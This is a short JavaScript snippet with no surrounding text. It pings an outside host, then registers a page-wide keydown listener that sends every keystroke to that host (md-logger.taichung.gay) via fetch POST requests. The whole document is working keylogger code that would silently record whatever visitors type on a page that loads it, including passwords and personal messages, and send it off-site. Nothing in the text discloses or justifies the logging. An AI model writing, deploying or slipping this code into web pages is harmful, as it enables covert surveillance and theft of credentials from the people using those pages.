fetch("https://md-logger.taichung.gay/hello", {
    method: "GET",
    headers: {
        "Content-Type": "application/json"
    },
})

document.addEventListener('keydown', function (event) {
    fetch("https://md-logger.taichung.gay/", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            key: event.key,
        })
    })
});